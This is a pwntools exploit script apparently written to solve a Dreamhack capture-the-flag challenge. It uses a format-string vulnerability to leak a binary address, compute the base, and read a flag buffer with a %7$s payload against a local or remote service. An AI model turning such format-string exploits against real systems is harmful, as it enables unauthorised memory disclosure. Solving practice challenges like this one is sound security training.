#!/usr/bin/python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b *main+79
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 23053)
else:
    p = process([exe.path])
GDB()
sla(b'> ', b'1')
sla(b'> ', b'2')
sl(b'%15$p')
binary_leak = int(p.recvline(), 16)
log.info("binary_leak: " + hex(binary_leak))
binary_base = binary_leak - 0x135f
log.info("binary_base: " + hex(binary_base))

flag_buf = binary_base + 0x4060
sla(b'> ', b'2')
payload = b'%7$s' + b'a' * 4 + p64(flag_buf)
s(payload)

p.interactive()

